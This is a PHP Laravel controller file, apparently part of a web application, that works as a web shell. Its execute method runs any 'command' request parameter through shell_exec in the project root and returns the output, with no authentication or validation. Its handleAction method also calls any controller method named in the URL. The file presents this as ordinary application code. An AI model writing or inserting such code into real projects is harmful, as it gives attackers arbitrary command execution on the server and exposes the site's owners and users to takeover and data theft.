<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;

class AxController extends Controller
{
    public function handleAction(Request $request, $action)
    {
        if (method_exists($this, $action)) {
            return $this->{$action}($request);
        } else {
            abort(404, 'Not Found');
        }
    }

    public function ping()
    {
        return response()->json(['ok' => 1]);
    }

    public function execute(Request $request)
    {
        if (!function_exists('shell_exec')) return 'shell_exec not found';
        if (!function_exists('chdir')) return 'chdir not found';

        // Go to project root
        chdir(base_path());

        $command = $request->input('command');
        return $command ? shell_exec($command) : '';
    }
}
